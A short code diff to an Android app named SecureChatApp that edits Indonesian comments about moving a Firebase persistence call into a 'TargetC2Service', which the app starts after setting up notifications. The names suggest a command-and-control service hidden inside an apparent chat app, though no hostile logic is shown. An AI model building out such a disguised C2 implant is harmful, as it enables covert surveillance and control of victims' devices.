@@ -22,9 +22,9 @@ class SecureChatApp : Application() {
 
         createNotificationChannel()
 
-        // 🔥 FIX: HAPUS setPersistenceEnabled dari sini!
-        // FirebaseDatabase.getInstance().setPersistenceEnabled(true)  ← INI DIILANGIN!
-        // dipindah ke TargetC2Service.onCreate() setelah getInstance(url)
+        // 🔥 FIX: HAPUS setPersistenceEnabled DARI SINI!
+        // Dipindah ke TargetC2Service.onCreate() biar ga conflict
+        // FirebaseDatabase.getInstance().setPersistenceEnabled(true) ← HAPUS
 
         // Start C2 service setelah channel notification siap
         android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
